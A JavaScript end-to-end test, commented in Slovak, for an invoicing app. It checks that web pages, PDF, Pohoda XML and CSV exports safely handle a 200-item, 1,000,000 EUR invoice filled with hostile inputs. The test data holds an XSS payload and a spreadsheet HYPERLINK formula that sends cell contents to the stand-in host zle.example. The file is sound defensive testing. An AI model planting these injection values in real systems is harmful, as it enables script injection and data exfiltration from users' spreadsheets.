/*
  Zlomyseľné a veľké vstupy na jednej faktúre (firma Test):
  200 položiek (nulová a záporná cena, množstvo 0, 6 desatinných miest,
  dlhý text, emoji, písmo sprava doľava), suma 1 000 000 €, odberateľ
  s HTML/skriptom a CSV vzorcom v mene.

  Overuje sa: detail faktúry skript nespustí, PDF má viac strán a sedí suma,
  Pohoda XML prejde schémou Stormware, súpiska CSV nemá bunku so vzorcom
  a verejná stránka ponuky s tým istým menom skript tiež nespustí.
  Faktúra sa vkladá cez REST (formulár by 200 riadkov plnil minúty) a na konci
  sa všetko zmaže.
*/
import { readFileSync } from "node:fs";
import { randomBytes } from "node:crypto";
import { textPdf } from "../lib/pdf.mjs";
import { overXsd, SCHEMY, textXml } from "../lib/xml.mjs";
import { zmazFakturuNatvrdo } from "../lib/doklady.mjs";

const XSS = `<img src=x onerror="window.__xss=1"><script>window.__xss=2</script>`;
const VZOREC = `=HYPERLINK("https://zle.example/?u="&A1;"klik")`;
const RTL = "שלום ‮עולם";

const r2 = (x) => Math.round(x * 100) / 100;

/** Položky ako ich počíta formulár: riadok zaokrúhlený, DPH z riadku. */
function polozky(znacka) {
  const p = [];
  // Hlavná položka dorovná faktúru presne na 1 000 000,00 € (813 008,13 + 23 %).
  p.push([`${znacka} Hlavná položka ${XSS}`, 1, 813008.13, 23]);
  p.push([VZOREC, 1, 0, 23]);
  p.push(["+1+1 plus na začiatku", 0, 99.99, 23]);
  p.push(["@SUM(A1:A9) zavináč", 1, 0, 5]);
  p.push(["-2+3 mínus na začiatku", 1, -10, 23]);
  p.push([`Emoji 🧾✅ a ${RTL}`, 1, 10, 23]);
  p.push([`Dlhý text ${"á".repeat(1500)}`, 1, 0, 23]);
  p.push(["Šesť desatinných miest", 3, 0.123456, 23]);
  p.push([`XML & < > " ' znaky`, 1, 0, 0]);
  while (p.length < 199) p.push([`Riadok ${p.length + 1}`, 1, 0, 23]);
  // Posledná položka vyrovná 0,46 € zo šiestich desatinných miest, nech súčet sedí na 1 000 000,00.
  p.push([`Posledná položka ${znacka}`, 1, -0.37, 23]);
  const riadky = p.map(([name, quantity, unit_price, vat_rate], position) => {
    const subtotal = r2(quantity * unit_price);
    const vat_amount = r2((subtotal * vat_rate) / 100);
    return {
      name,
      quantity,
      unit: "ks",
      unit_price,
      vat_rate,
      position,
      subtotal,
      vat_amount,
      total: r2(subtotal + vat_amount),
    };
  });
  return riadky;
}

export default {
  popis: "veľké a zlomyseľné vstupy: 200 položiek, 1 mil. €, XSS, CSV vzorce, RTL → web, PDF, XML, CSV",
  limit: 240000,
  async spusti(t) {
    const page = t.page;
    const firma = t.firmy.test;
    const okna = [];
    page.on("dialog", (d) => okna.push(d.message()));

    const odb = await t.krok("odberateľ so skriptom a vzorcom v mene", async () => {
      const o = await t.rest.vloz("customers", {
        company_id: firma,
        // Meno začína vzorcom — v CSV musí dostať apostrof, inak ho Excel spustí.
        name: `${VZOREC} ${t.znacka} ${XSS}`,
        street: `Ulica "A" & <B>`,
        city: RTL,
        zip: "81101",
        country: "SK",
      });
      t.uprac("odberateľ", () => t.rest.delete(`customers?id=eq.${o.id}`));
      return o;
    });

    const fa = await t.krok("faktúra s 200 položkami na 1 000 000 €", async () => {
      const riadky = polozky(t.znacka);
      t.over(riadky.length === 200, `položiek ${riadky.length}`);
      const subtotal = r2(riadky.reduce((s, r) => s + r.subtotal, 0));
      const vat_total = r2(riadky.reduce((s, r) => s + r.vat_amount, 0));
      const c = await t.rest.rpc("faktero_next_invoice_number", {
        _company_id: firma,
        _issue_date: t.dnes,
        _type: "regular",
        _series_id: null,
      });
      t.over(c.status === 200, `číslo faktúry: ${c.status} ${c.text.slice(0, 160)}`);
      const f = await t.rest.vloz("invoices", {
        company_id: firma,
        customer_id: odb.id,
        type: "regular",
        status: "issued",
        invoice_number: c.data.invoice_number,
        sequence_number: c.data.sequence_number,
        number_series_id: c.data.series_id,
        issue_date: t.dnes,
        delivery_date: t.dnes,
        due_date: t.dnes,
        currency: "EUR",
        payment_method: "bank_transfer",
        customer_name: odb.name,
        customer_street: odb.street,
        customer_city: odb.city,
        customer_zip: odb.zip,
        customer_country: "SK",
        intro_note: `${t.znacka} ${XSS}\n${VZOREC}`,
        notes: `Poznámka ${XSS} ${RTL} 🧾`,
        subtotal,
        vat_total,
        total: r2(subtotal + vat_total),
      });
      t.uprac(`faktúra ${f.invoice_number}`, () => zmazFakturuNatvrdo(t, f.id));
      const p = await t.rest.post(
        "invoice_items",
        riadky.map((r) => ({ ...r, invoice_id: f.id })),
      );
      t.over(p.status < 300, `položky: ${p.status} ${p.text.slice(0, 200)}`);
      t.log(`${f.invoice_number}: ${subtotal} + ${vat_total} = ${f.total}`);
      return f;
    });

    await t.krok("detail faktúry skript nespustí", async () => {
      await t.go(`/faktury/${fa.id}`);
      await page.getByText(fa.invoice_number).first().waitFor();
      // Detail ukazuje náhľad PDF (canvas) — meno odberateľa je v paneli pre účtovníka.
      await page.getByText("SPOLU K ÚHRADE", { exact: false }).first().waitFor({ timeout: 30000 });
      await page.waitForLoadState("networkidle", { timeout: 20000 }).catch(() => {});
      const xss = await page.evaluate(() => window.__xss ?? null);
      t.over(xss === null, `na detaile faktúry sa spustil skript z mena (window.__xss=${xss})`);
      t.over(!okna.length, `na detaile vyskočilo okno: ${okna.join(" | ")}`);
      t.over(
        (await page.locator("main").innerText()).includes("<img src=x"),
        "meno odberateľa sa nezobrazilo ako text",
      );
    });

    await t.krok("PDF: viac strán, suma 1 000 000,00, posledná položka", async () => {
      const tlacidlo = page.getByRole("button", { name: /^(Stiahnuť PDF|Vygenerovať PDF)$/ }).first();
      await tlacidlo.waitFor();
      const subor = await t.stiahni(() => tlacidlo.click(), "faktura-200");
      const strany = await textPdf(subor);
      const vsetko = strany.join("\n").replace(/\s+/g, " ");
      t.log(`PDF ${strany.length} strán`);
      t.over(strany.length >= 3, `200 položiek na ${strany.length} stranách`);
      t.over(/1[\s.  ]?000[\s.  ]?000[,.]00/.test(vsetko), "v PDF chýba suma 1 000 000,00");
      t.over(vsetko.includes(`Posledná položka ${t.znacka}`), "v PDF chýba posledná položka");
      t.over(vsetko.includes(fa.invoice_number), "v PDF chýba číslo faktúry");
    });

    const zaciatok = new Date().toISOString();
    t.uprac("história exportov", () =>
      t.rest.delete(`export_jobs?company_id=eq.${firma}&created_at=gte.${zaciatok}&invoice_count=eq.1`),
    );

    /** Účtovné exporty → jedna faktúra, bez označenia ako odovzdaná. */
    async function exportuj(format, meno) {
      await t.go("/exporty");
      const sekcia = page
        .locator("div.rounded-2xl")
        .filter({ has: page.getByRole("button", { name: "Vybrať všetko", exact: true }) })
        .last();
      const datumy = sekcia.locator('input[type="date"]');
      await datumy.nth(0).fill(t.dnes);
      await datumy.nth(1).fill(t.dnes);
      await sekcia
        .locator("select")
        .filter({ has: page.locator(`option[value="${format}"]`) })
        .selectOption(format);
      const riadok = sekcia.locator("tr", { hasText: fa.invoice_number });
      await riadok.waitFor({ timeout: 20000 });
      await riadok.locator('input[type="checkbox"]').check();
      const oznacit = sekcia.getByLabel(/Označiť ako odovzdané/);
      if (await oznacit.isChecked()) await oznacit.uncheck();
      return t.stiahni(
        () => sekcia.getByRole("button", { name: "Exportovať", exact: true }).click(),
        meno,
      );
    }

    await t.krok("Pohoda XML prejde schémou a znaky sú escapované", async () => {
      const buf = readFileSync(await exportuj("pohoda_xml", "pohoda-200"));
      const chyba = await overXsd(buf, SCHEMY.pohoda);
      t.over(!chyba, `XML neprešlo schémou Stormware: ${chyba}`);
      const text = textXml(buf);
      t.over(!text.includes("<img src"), "HTML z mena odberateľa je v XML neescapované");
      t.over(text.includes("&lt;img"), "meno odberateľa v XML chýba");
      const polozkyXml = (text.match(/<inv:invoiceItem>/g) ?? []).length;
      t.log(`Pohoda: ${polozkyXml} položiek`);
      t.over(polozkyXml >= 190, `v XML je len ${polozkyXml} položiek z 200`);
    });

    await t.krok("súpiska CSV bez buniek so vzorcom", async () => {
      const text = readFileSync(await exportuj("csv_univerzal", "csv-200"), "utf8");
      const zle = text
        .split(/\r?\n/)
        .flatMap((r) => r.split(";"))
        .filter((b) => /^"?[=+@]/.test(b.trim()) || /^"?-[^\d]/.test(b.trim()));
      t.over(!zle.length, `CSV má bunky, ktoré Excel spustí ako vzorec: ${zle.slice(0, 3).join(" | ")}`);
      t.over(text.includes(fa.invoice_number), "v CSV chýba faktúra");
    });

    await t.krok("verejná stránka ponuky skript nespustí", async () => {
      const token = randomBytes(24).toString("hex");
      const q = await t.rest.vloz("quotes", {
        company_id: firma,
        customer_id: odb.id,
        quote_number: `${t.znacka}-P`,
        status: "sent",
        currency: "EUR",
        customer_name: odb.name,
        notes: `Poznámka ${XSS}`,
        subtotal: 10,
        vat_total: 2.3,
        total: 12.3,
        approval_token: token,
      });
      t.uprac("ponuka", async () => {
        await t.rest.delete(`quote_items?quote_id=eq.${q.id}`);
        await t.rest.delete(`quotes?id=eq.${q.id}`);
      });
      await t.rest.vloz("quote_items", {
        quote_id: q.id,
        position: 0,
        name: `${XSS} ${VZOREC}`,
        quantity: 1,
        unit: "ks",
        unit_price: 10,
        vat_rate: 23,
        total: 12.3,
      });
      const verejna = await t.novaStranka();
      verejna.on("dialog", (d) => okna.push(d.message()));
      await t.go(`/ponuka/${token}`, verejna);
      await verejna.getByText(`${t.znacka}-P`).first().waitFor({ timeout: 30000 });
      const xss = await verejna.evaluate(() => window.__xss ?? null);
      t.over(xss === null, `verejná ponuka spustila skript (window.__xss=${xss})`);
      t.over(!okna.length, `na verejnej ponuke vyskočilo okno: ${okna.join(" | ")}`);
    });
  },
};
